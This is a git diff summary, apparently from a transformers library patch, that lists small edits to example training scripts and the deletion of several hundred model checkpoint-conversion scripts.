 .../image-pretraining/run_mim_no_trainer.py   |    2 +-
 .../run_instance_segmentation.py              |    2 +-
 .../run_instance_segmentation_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_clm.py |    2 +-
 .../language-modeling/run_clm_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_fim.py |    2 +-
 .../language-modeling/run_fim_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_mlm.py |    2 +-
 .../language-modeling/run_mlm_no_trainer.py   |    2 +-
 examples/pytorch/language-modeling/run_plm.py |    2 +-
 examples/pytorch/multiple-choice/run_swag.py  |    2 +-
 .../multiple-choice/run_swag_no_trainer.py    |    2 +-
 .../object-detection/run_object_detection.py  |    2 +-
 .../run_object_detection_no_trainer.py        |    2 +-
 examples/pytorch/question-answering/run_qa.py |    2 +-
 .../question-answering/run_qa_beam_search.py  |    2 +-
 .../run_qa_beam_search_no_trainer.py          |    2 +-
 .../question-answering/run_qa_no_trainer.py   |    2 +-
 .../question-answering/run_seq2seq_qa.py      |    2 +-
 .../run_semantic_segmentation.py              |    2 +-
 .../run_semantic_segmentation_no_trainer.py   |    2 +-
 .../run_speech_recognition_ctc.py             |    2 +-
 .../run_speech_recognition_ctc_adapter.py     |    2 +-
 .../run_speech_recognition_seq2seq.py         |    2 +-
 .../summarization/run_summarization.py        |    2 +-
 .../run_summarization_no_trainer.py           |    2 +-
 .../text-classification/run_classification.py |    2 +-
 .../pytorch/text-classification/run_glue.py   |    2 +-
 .../run_glue_no_trainer.py                    |    2 +-
 .../pytorch/text-classification/run_xnli.py   |    2 +-
 .../pytorch/token-classification/run_ner.py   |    2 +-
 .../run_ner_no_trainer.py                     |    2 +-
 .../pytorch/translation/run_translation.py    |    2 +-
 .../translation/run_translation_no_trainer.py |    2 +-
 .../contrastive-image-text/run_clip.py        |    2 +-
 .../run_image_classification.py               |    2 +-
 .../tensorflow/multiple-choice/run_swag.py    |    2 +-
 .../tensorflow/question-answering/run_qa.py   |    2 +-
 .../summarization/run_summarization.py        |    2 +-
 .../text-classification/run_glue.py           |    2 +-
 .../tensorflow/translation/run_translation.py |    2 +-
 setup.py                                      |    2 +-
 src/transformers/__init__.py                  |    2 +-
 ...lbert_original_tf_checkpoint_to_pytorch.py |   62 -
 .../models/align/convert_align_tf_to_hf.py    |  389 -----
 .../models/aria/convert_aria_weights_to_hf.py |  162 --
 ...trogram_transformer_original_to_pytorch.py |  279 ----
 .../bamba/convert_mamba_ssm_checkpoint.py     |  273 ----
 .../models/bark/convert_suno_to_hf.py         |  263 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  156 --
 .../beit/convert_beit_unilm_to_pytorch.py     |  373 -----
 ...bert_original_tf2_checkpoint_to_pytorch.py |  246 ---
 ..._bert_original_tf_checkpoint_to_pytorch.py |   62 -
 ..._bert_pytorch_checkpoint_to_original_tf.py |  112 --
 ...ping_original_tf2_checkpoint_to_pytorch.py |  188 ---
 ...gbird_original_tf_checkpoint_to_pytorch.py |   69 -
 .../convert_bigbird_pegasus_tf_to_pytorch.py  |  170 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  292 ----
 .../models/bit/convert_bit_to_pytorch.py      |  177 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  114 --
 .../convert_blip_original_pytorch_to_hf.py    |  191 ---
 .../convert_blip_2_original_to_pytorch.py     |  390 -----
 ...rt_bloom_original_checkpoint_to_pytorch.py |  254 ----
 .../models/bros/convert_bros_to_pytorch.py    |  145 --
 ..._byt5_original_tf_checkpoint_to_pytorch.py |   59 -
 ...anine_original_tf_checkpoint_to_pytorch.py |   65 -
 .../convert_chameleon_weights_to_hf.py        |  476 ------
 ...ert_chinese_clip_original_pytorch_to_hf.py |  134 --
 .../convert_clap_original_pytorch_to_hf.py    |  133 --
 .../convert_clip_original_pytorch_to_hf.py    |  156 --
 .../convert_clipseg_original_pytorch_to_hf.py |  264 ----
 .../models/clvp/convert_clvp_to_hf.py         |  234 ---
 .../colpali/convert_colpali_weights_to_hf.py  |  214 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  324 ----
 ...ginal_tf1_checkpoint_to_pytorch_and_tf2.py |   57 -
 .../convnext/convert_convnext_to_pytorch.py   |  242 ---
 .../convert_convnextv2_to_pytorch.py          |  286 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  362 -----
 ..._original_pytorch_checkpoint_to_pytorch.py |  233 ---
 .../models/dac/convert_dac_checkpoint.py      |  261 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  285 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  207 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  374 -----
 .../convert_deformable_detr_to_pytorch.py     |  236 ---
 .../deit/convert_deit_timm_to_pytorch.py      |  218 ---
 ...original_gluonnlp_checkpoint_to_pytorch.py |  318 ----
 .../deta/convert_deta_resnet_to_pytorch.py    |  319 ----
 .../deta/convert_deta_swin_to_pytorch.py      |  326 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  252 ----
 ...convert_gptsan_tf_checkpoint_to_pytorch.py |  181 ---
 .../deprecated/jukebox/convert_jukebox.py     |  279 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  292 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |   70 -
 ...fo_xl_original_tf_checkpoint_to_pytorch.py |  121 --
 .../deprecated/van/convert_van_to_pytorch.py  |  290 ----
 .../convert_vit_hybrid_timm_to_pytorch.py     |  282 ----
 .../convert_depth_anything_to_hf.py           |  368 -----
 .../convert_distill_any_depth_to_hf.py        |  246 ---
 .../convert_depth_pro_weights_to_hf.py        |  254 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  277 ----
 .../models/detr/convert_detr_to_pytorch.py    |  385 -----
 ..._original_pytorch_checkpoint_to_pytorch.py |   46 -
 .../models/dinov2/convert_dinov2_to_hf.py     |  285 ----
 .../convert_dinov2_with_registers_to_hf.py    |  291 ----
 .../dit/convert_dit_unilm_to_pytorch.py       |  230 ---
 .../models/donut/convert_donut_to_pytorch.py  |  234 ---
 ...vert_dpr_original_checkpoint_to_pytorch.py |  143 --
 .../models/dpt/convert_dinov2_depth_to_hf.py  |  383 -----
 .../models/dpt/convert_dpt_beit_to_hf.py      |  305 ----
 .../dpt/convert_dpt_hybrid_to_pytorch.py      |  315 ----
 .../models/dpt/convert_dpt_swinv2_to_hf.py    |  321 ----
 .../models/dpt/convert_dpt_to_pytorch.py      |  285 ----
 .../convert_efficientnet_to_pytorch.py        |  339 -----
 ...ectra_original_tf_checkpoint_to_pytorch.py |   79 -
 .../models/emu3/convert_emu3_weights_to_hf.py |  448 ------
 .../convert_encodec_checkpoint_to_pytorch.py  |  365 -----
 src/transformers/models/esm/convert_esm.py    |  399 -----
 .../falcon/convert_custom_code_checkpoint.py  |   74 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  210 ---
 .../fastspeech2_conformer/convert_hifigan.py  |  134 --
 .../convert_model_with_hifigan.py             |  102 --
 .../flava/convert_dalle_to_flava_codebook.py  |  102 --
 .../convert_flava_original_pytorch_to_hf.py   |   99 --
 ...net_original_flax_checkpoint_to_pytorch.py |  156 --
 .../focalnet/convert_focalnet_to_hf_format.py |  237 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  280 ----
 ...unnel_original_tf_checkpoint_to_pytorch.py |   67 -
 .../fuyu/convert_fuyu_model_weights_to_hf.py  |  134 --
 .../gemma/convert_gemma_weights_to_hf.py      |  206 ---
 .../gemma2/convert_gemma2_weights_to_hf.py    |  239 ---
 .../convert_gemma3_weights_orbax_to_hf.py     |  589 --------
 .../models/git/convert_git_to_pytorch.py      |  448 ------
 .../models/glm/convert_glm_weights_to_hf.py   |  195 ---
 .../models/glpn/convert_glpn_to_pytorch.py    |  218 ---
 .../convert_got_ocr2_weights_to_hf.py         |  274 ----
 ..._gpt2_original_tf_checkpoint_to_pytorch.py |   68 -
 .../convert_gpt_neo_mesh_tf_to_pytorch.py     |   71 -
 .../gpt_sw3/convert_megatron_to_pytorch.py    |  197 ---
 .../convert_grounding_dino_to_hf.py           |  491 ------
 .../groupvit/convert_groupvit_nvlab_to_hf.py  |  217 ---
 .../models/hiera/convert_hiera_to_hf.py       |  369 -----
 ...rt_original_s3prl_checkpoint_to_pytorch.py |  222 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  261 ----
 ...rt_original_s3prl_checkpoint_to_pytorch.py |   68 -
 .../convert_idefics2_weights_to_hf.py         |  185 ---
 .../convert_idefics3_weights_to_hf.py         |  214 ---
 .../models/ijepa/convert_ijepa_to_hf.py       |  267 ----
 ...onvert_imagegpt_original_tf2_to_pytorch.py |   71 -
 ...onvert_instructblip_original_to_pytorch.py |  303 ----
 ...t_instructblipvideo_original_to_pytorch.py |  305 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 .../levit/convert_levit_timm_to_pytorch.py    |  181 ---
 .../llama/convert_llama_weights_to_hf.py      |  601 --------
 .../llama4/convert_llama4_weights_to_hf.py    |  736 ---------
 .../llava/convert_llava_weights_to_hf.py      |  204 ---
 .../convert_llava_next_weights_to_hf.py       |  397 -----
 .../convert_llava_next_video_weights_to_hf.py |  276 ----
 .../convert_llava_onevision_weights_to_hf.py  |  388 -----
 ...r_original_pytorch_lightning_to_pytorch.py |   85 --
 .../convert_longt5x_checkpoint_to_flax.py     |  215 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  170 ---
 ...xmert_original_tf_checkpoint_to_pytorch.py |   59 -
 ...t_m2m100_original_checkpoint_to_pytorch.py |   85 --
 ...convert_mamba_ssm_checkpoint_to_pytorch.py |  153 --
 ...onvert_mamba2_ssm_checkpoint_to_pytorch.py |  193 ---
 .../convert_marian_tatoeba_to_pytorch.py      | 1327 -----------------
 .../marian/convert_marian_to_pytorch.py       |  717 ---------
 ..._original_pytorch_checkpoint_to_pytorch.py | 1019 -------------
 ..._original_pytorch_checkpoint_to_pytorch.py |  731 ---------
 .../convert_maskformer_resnet_to_pytorch.py   |  390 -----
 .../convert_maskformer_swin_to_pytorch.py     |  333 -----
 ...rt_mbart_original_checkpoint_to_pytorch.py |   83 --
 .../convert_megatron_bert_checkpoint.py       |  334 -----
 .../convert_megatron_gpt2_checkpoint.py       |  358 -----
 .../convert_mimi_checkpoint_to_pytorch.py     |  198 ---
 .../mistral/convert_mistral_weights_to_hf.py  |  282 ----
 .../convert_mistral3_weights_to_hf.py         |  241 ---
 .../mixtral/convert_mixtral_weights_to_hf.py  |  244 ---
 .../mllama/convert_mllama_weights_to_hf.py    |  639 --------
 ..._original_pytorch_checkpoint_to_pytorch.py |  229 ---
 ...ebert_original_tf_checkpoint_to_pytorch.py |   58 -
 ...nvert_original_tf_checkpoint_to_pytorch.py |  141 --
 ...nvert_original_tf_checkpoint_to_pytorch.py |  177 ---
 .../mobilevit/convert_mlcvnets_to_pytorch.py  |  311 ----
 .../convert_mlcvnets_to_pytorch.py            |  332 -----
 .../moonshine/convert_usefulsensors_to_hf.py  |  169 ---
 .../moshi/convert_moshi_transformers.py       |  311 ----
 .../mra/convert_mra_pytorch_to_pytorch.py     |  110 --
 .../musicgen/convert_musicgen_transformers.py |  236 ---
 .../convert_musicgen_melody_transformers.py   |  267 ----
 ..._myt5_original_tf_checkpoint_to_pytorch.py |   60 -
 .../nemotron/convert_nemotron_nemo_to_hf.py   |  346 -----
 ..._sharded_original_checkpoint_to_pytorch.py |  161 --
 .../models/nougat/convert_nougat_to_hf.py     |  282 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  111 --
 .../models/olmo/convert_olmo_weights_to_hf.py |  248 ---
 .../olmo2/convert_olmo2_weights_to_hf.py      |  306 ----
 .../olmoe/convert_olmoe_weights_to_hf.py      |  281 ----
 .../omdet_turbo/convert_omdet_turbo_to_hf.py  |  349 -----
 .../oneformer/convert_to_hf_oneformer.py      | 1191 ---------------
 ...penai_original_tf_checkpoint_to_pytorch.py |   74 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  113 --
 .../models/owlv2/convert_owlv2_to_hf.py       |  422 ------
 .../convert_owlvit_original_flax_to_hf.py     |  406 -----
 .../convert_paligemma2_weights_to_hf.py       |  415 ------
 .../convert_paligemma_weights_to_hf.py        |  347 -----
 .../pegasus/convert_pegasus_tf_to_pytorch.py  |  131 --
 .../convert_perceiver_haiku_to_pytorch.py     |  468 ------
 .../convert_persimmon_weights_to_hf.py        |  129 --
 .../models/phi/convert_phi_weights_to_hf.py   |  207 ---
 .../convert_phi4_multimodal_weights_to_hf.py  |  229 ---
 ...nvert_pix2struct_original_pytorch_to_hf.py |  155 --
 .../pixtral/convert_pixtral_weights_to_hf.py  |  246 ---
 ...ert_plbart_original_checkpoint_to_torch.py |   94 --
 .../convert_poolformer_original_to_pytorch.py |  214 ---
 .../convert_pop2piano_weights_to_hf.py        |  190 ---
 .../convert_prompt_depth_anything_to_hf.py    |  292 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  159 --
 .../models/pvt/convert_pvt_to_pytorch.py      |  226 ---
 .../pvt_v2/convert_pvt_v2_to_pytorch.py       |  294 ----
 .../convert_recurrent_gemma_to_hf.py          |  222 ---
 ...ert_reformer_trax_checkpoint_to_pytorch.py |  226 ---
 .../convert_regnet_seer_10b_to_pytorch.py     |  308 ----
 .../regnet/convert_regnet_to_pytorch.py       |  458 ------
 ...onvert_rembert_tf_checkpoint_to_pytorch.py |   62 -
 .../resnet/convert_resnet_to_pytorch.py       |  199 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  177 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 ...ormer_original_tf_checkpoint_to_pytorch.py |   62 -
 ..._detr_original_pytorch_checkpoint_to_hf.py |  782 ----------
 .../convert_rt_detr_v2_weights_to_hf.py       |  363 -----
 .../rwkv/convert_rwkv_checkpoint_to_hf.py     |  209 ---
 .../models/sam/convert_sam_to_hf.py           |  251 ----
 .../seamless_m4t/convert_fairseq2_to_hf.py    |  396 -----
 .../seamless_m4t_v2/convert_fairseq2_to_hf.py |  404 -----
 .../convert_segformer_original_to_pytorch.py  |  387 -----
 .../models/seggpt/convert_seggpt_to_hf.py     |  221 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  305 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  317 ----
 ...onvert_shieldgemma2_weights_orbax_to_hf.py |  470 ------
 .../models/siglip/convert_siglip_to_hf.py     |  533 -------
 .../models/siglip2/convert_siglip2_to_hf.py   |  438 ------
 ...rt_wav2vec2_seq2seq_original_to_pytorch.py |  357 -----
 ...xt_wav2vec2_seq2seq_original_to_pytorch.py |  316 ----
 .../convert_s2t_fairseq_to_tfms.py            |  121 --
 .../models/speecht5/convert_hifigan.py        |  108 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  401 -----
 .../superglue/convert_superglue_to_hf.py      |  342 -----
 .../convert_superpoint_to_pytorch.py          |  175 ---
 .../convert_swiftformer_original_to_hf.py     |  175 ---
 .../swin/convert_swin_simmim_to_pytorch.py    |  182 ---
 .../swin/convert_swin_timm_to_pytorch.py      |  173 ---
 .../convert_swin2sr_original_to_pytorch.py    |  278 ----
 .../swinv2/convert_swinv2_timm_to_pytorch.py  |  219 ---
 .../switch_transformers/convert_big_switch.py |  194 ---
 ...ers_original_flax_checkpoint_to_pytorch.py |  203 ---
 ...rt_t5_original_tf_checkpoint_to_pytorch.py |   59 -
 .../t5/convert_t5x_checkpoint_to_flax.py      |  235 ---
 .../t5/convert_t5x_checkpoint_to_pytorch.py   |  238 ---
 .../convert_table_transformer_to_hf.py        |  317 ----
 ...convert_table_transformer_to_hf_no_timm.py |  434 ------
 ...tapas_original_tf_checkpoint_to_pytorch.py |  137 --
 .../models/textnet/convert_textnet_to_hf.py   |  208 ---
 .../convert_timesformer_to_pytorch.py         |  253 ----
 .../trocr/convert_trocr_unilm_to_pytorch.py   |  237 ---
 .../models/udop/convert_udop_to_hf.py         |  224 ---
 .../convert_umt5_checkpoint_to_pytorch.py     |  274 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  273 ----
 ...ch_original_s3prl_checkpoint_to_pytorch.py |  109 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  224 ---
 .../models/univnet/convert_univnet.py         |  162 --
 .../convert_convnext_upernet_to_pytorch.py    |  214 ---
 .../convert_swin_upernet_to_pytorch.py        |  297 ----
 .../convert_video_llava_weights_to_hf.py      |  159 --
 .../videomae/convert_videomae_to_pytorch.py   |  324 ----
 .../vilt/convert_vilt_original_to_pytorch.py  |  299 ----
 .../convert_vipllava_weights_to_hf.py         |  132 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  149 --
 .../models/vit/convert_dino_to_pytorch.py     |  218 ---
 .../models/vit/convert_vit_timm_to_pytorch.py |  254 ----
 .../vit_mae/convert_vit_mae_to_pytorch.py     |  178 ---
 .../models/vit_msn/convert_msn_to_pytorch.py  |  245 ---
 .../models/vitmatte/convert_vitmatte_to_hf.py |  170 ---
 .../models/vitpose/convert_vitpose_to_hf.py   |  428 ------
 .../vits/convert_original_checkpoint.py       |  390 -----
 .../vivit/convert_vivit_flax_to_pytorch.py    |  231 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  385 -----
 ...c2_original_s3prl_checkpoint_to_pytorch.py |  109 --
 .../convert_wav2vec2_seamless_checkpoint.py   |  217 ---
 ..._original_pytorch_checkpoint_to_pytorch.py |  309 ----
 ..._original_pytorch_checkpoint_to_pytorch.py |  206 ---
 ...lm_original_s3prl_checkpoint_to_pytorch.py |  109 --
 .../models/whisper/convert_openai_to_hf.py    |  370 -----
 .../convert_x_clip_original_pytorch_to_hf.py  |  386 -----
 .../convert_xglm_original_ckpt_to_trfms.py    |   68 -
 ..._original_pytorch_checkpoint_to_pytorch.py |   77 -
 ..._original_pytorch_checkpoint_to_pytorch.py |  183 ---
 ...xlnet_original_tf_checkpoint_to_pytorch.py |  113 --
 ..._original_pytorch_checkpoint_to_pytorch.py |  212 ---
 .../models/yolos/convert_yolos_to_pytorch.py  |  267 ----
 .../yoso/convert_yoso_pytorch_to_pytorch.py   |  108 --
 .../models/zoedepth/convert_zoedepth_to_hf.py |  426 ------
 312 files changed, 53 insertions(+), 66972 deletions(-)
 delete mode 100644 src/transformers/models/albert/convert_albert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/align/convert_align_tf_to_hf.py
 delete mode 100644 src/transformers/models/aria/convert_aria_weights_to_hf.py
 delete mode 100644 src/transformers/models/audio_spectrogram_transformer/convert_audio_spectrogram_transformer_original_to_pytorch.py
 delete mode 100644 src/transformers/models/bamba/convert_mamba_ssm_checkpoint.py
 delete mode 100644 src/transformers/models/bark/convert_suno_to_hf.py
 delete mode 100644 src/transformers/models/bart/convert_bart_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/beit/convert_beit_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/bert/convert_bert_original_tf2_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/bert/convert_bert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bert/convert_bert_pytorch_checkpoint_to_original_tf.py
 delete mode 100644 src/transformers/models/bert/convert_bert_token_dropping_original_tf2_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/big_bird/convert_bigbird_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bigbird_pegasus/convert_bigbird_pegasus_tf_to_pytorch.py
 delete mode 100755 src/transformers/models/biogpt/convert_biogpt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bit/convert_bit_to_pytorch.py
 delete mode 100644 src/transformers/models/blenderbot/convert_blenderbot_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/blip/convert_blip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/blip_2/convert_blip_2_original_to_pytorch.py
 delete mode 100644 src/transformers/models/bloom/convert_bloom_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/bros/convert_bros_to_pytorch.py
 delete mode 100755 src/transformers/models/byt5/convert_byt5_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/canine/convert_canine_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/chameleon/convert_chameleon_weights_to_hf.py
 delete mode 100644 src/transformers/models/chinese_clip/convert_chinese_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clap/convert_clap_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clip/convert_clip_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clipseg/convert_clipseg_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/clvp/convert_clvp_to_hf.py
 delete mode 100644 src/transformers/models/colpali/convert_colpali_weights_to_hf.py
 delete mode 100644 src/transformers/models/conditional_detr/convert_conditional_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/convbert/convert_convbert_original_tf1_checkpoint_to_pytorch_and_tf2.py
 delete mode 100644 src/transformers/models/convnext/convert_convnext_to_pytorch.py
 delete mode 100644 src/transformers/models/convnextv2/convert_convnextv2_to_pytorch.py
 delete mode 100644 src/transformers/models/cvt/convert_cvt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dab_detr/convert_dab_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dac/convert_dac_checkpoint.py
 delete mode 100644 src/transformers/models/data2vec/convert_data2vec_audio_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/data2vec/convert_data2vec_text_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/data2vec/convert_data2vec_vision_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deformable_detr/convert_deformable_detr_to_pytorch.py
 delete mode 100644 src/transformers/models/deit/convert_deit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/bort/convert_bort_original_gluonnlp_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/deta/convert_deta_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/deta/convert_deta_swin_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/efficientformer/convert_efficientformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/gptsan_japanese/convert_gptsan_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/jukebox/convert_jukebox.py
 delete mode 100644 src/transformers/models/deprecated/mega/convert_mega_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/trajectory_transformer/convert_trajectory_transformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/transfo_xl/convert_transfo_xl_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/van/convert_van_to_pytorch.py
 delete mode 100644 src/transformers/models/deprecated/vit_hybrid/convert_vit_hybrid_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/depth_anything/convert_depth_anything_to_hf.py
 delete mode 100644 src/transformers/models/depth_anything/convert_distill_any_depth_to_hf.py
 delete mode 100644 src/transformers/models/depth_pro/convert_depth_pro_weights_to_hf.py
 delete mode 100644 src/transformers/models/detr/convert_detr_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/detr/convert_detr_to_pytorch.py
 delete mode 100644 src/transformers/models/dialogpt/convert_dialogpt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dinov2/convert_dinov2_to_hf.py
 delete mode 100644 src/transformers/models/dinov2_with_registers/convert_dinov2_with_registers_to_hf.py
 delete mode 100644 src/transformers/models/dit/convert_dit_unilm_to_pytorch.py
 delete mode 100644 src/transformers/models/donut/convert_donut_to_pytorch.py
 delete mode 100644 src/transformers/models/dpr/convert_dpr_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/dpt/convert_dinov2_depth_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_beit_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_hybrid_to_pytorch.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_swinv2_to_hf.py
 delete mode 100644 src/transformers/models/dpt/convert_dpt_to_pytorch.py
 delete mode 100644 src/transformers/models/efficientnet/convert_efficientnet_to_pytorch.py
 delete mode 100644 src/transformers/models/electra/convert_electra_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/emu3/convert_emu3_weights_to_hf.py
 delete mode 100644 src/transformers/models/encodec/convert_encodec_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/esm/convert_esm.py
 delete mode 100644 src/transformers/models/falcon/convert_custom_code_checkpoint.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_fastspeech2_conformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_hifigan.py
 delete mode 100644 src/transformers/models/fastspeech2_conformer/convert_model_with_hifigan.py
 delete mode 100644 src/transformers/models/flava/convert_dalle_to_flava_codebook.py
 delete mode 100644 src/transformers/models/flava/convert_flava_original_pytorch_to_hf.py
 delete mode 100644 src/transformers/models/fnet/convert_fnet_original_flax_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/focalnet/convert_focalnet_to_hf_format.py
 delete mode 100755 src/transformers/models/fsmt/convert_fsmt_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/funnel/convert_funnel_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/fuyu/convert_fuyu_model_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma/convert_gemma_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma2/convert_gemma2_weights_to_hf.py
 delete mode 100644 src/transformers/models/gemma3/convert_gemma3_weights_orbax_to_hf.py
 delete mode 100644 src/transformers/models/git/convert_git_to_pytorch.py
 delete mode 100644 src/transformers/models/glm/convert_glm_weights_to_hf.py
 delete mode 100644 src/transformers/models/glpn/convert_glpn_to_pytorch.py
 delete mode 100644 src/transformers/models/got_ocr2/convert_got_ocr2_weights_to_hf.py
 delete mode 100755 src/transformers/models/gpt2/convert_gpt2_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/gpt_neo/convert_gpt_neo_mesh_tf_to_pytorch.py
 delete mode 100644 src/transformers/models/gpt_sw3/convert_megatron_to_pytorch.py
 delete mode 100644 src/transformers/models/grounding_dino/convert_grounding_dino_to_hf.py
 delete mode 100644 src/transformers/models/groupvit/convert_groupvit_nvlab_to_hf.py
 delete mode 100644 src/transformers/models/hiera/convert_hiera_to_hf.py
 delete mode 100644 src/transformers/models/hubert/convert_distilhubert_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/hubert/convert_hubert_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/hubert/convert_hubert_original_s3prl_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/idefics2/convert_idefics2_weights_to_hf.py
 delete mode 100644 src/transformers/models/idefics3/convert_idefics3_weights_to_hf.py
 delete mode 100644 src/transformers/models/ijepa/convert_ijepa_to_hf.py
 delete mode 100644 src/transformers/models/imagegpt/convert_imagegpt_original_tf2_to_pytorch.py
 delete mode 100644 src/transformers/models/instructblip/convert_instructblip_original_to_pytorch.py
 delete mode 100644 src/transformers/models/instructblipvideo/convert_instructblipvideo_original_to_pytorch.py
 delete mode 100644 src/transformers/models/kosmos2/convert_kosmos2_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/levit/convert_levit_timm_to_pytorch.py
 delete mode 100644 src/transformers/models/llama/convert_llama_weights_to_hf.py
 delete mode 100644 src/transformers/models/llama4/convert_llama4_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava/convert_llava_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_next/convert_llava_next_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_next_video/convert_llava_next_video_weights_to_hf.py
 delete mode 100644 src/transformers/models/llava_onevision/convert_llava_onevision_weights_to_hf.py
 delete mode 100644 src/transformers/models/longformer/convert_longformer_original_pytorch_lightning_to_pytorch.py
 delete mode 100644 src/transformers/models/longt5/convert_longt5x_checkpoint_to_flax.py
 delete mode 100644 src/transformers/models/luke/convert_luke_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100755 src/transformers/models/lxmert/convert_lxmert_original_tf_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/m2m_100/convert_m2m100_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mamba/convert_mamba_ssm_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/mamba2/convert_mamba2_ssm_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/marian/convert_marian_tatoeba_to_pytorch.py
 delete mode 100644 src/transformers/models/marian/convert_marian_to_pytorch.py
 delete mode 100644 src/transformers/models/mask2former/convert_mask2former_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_original_pytorch_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_resnet_to_pytorch.py
 delete mode 100644 src/transformers/models/maskformer/convert_maskformer_swin_to_pytorch.py
 delete mode 100644 src/transformers/models/mbart/convert_mbart_original_checkpoint_to_pytorch.py
 delete mode 100644 src/transformers/models/megatron_bert/convert_megatron_bert_checkpoint.py
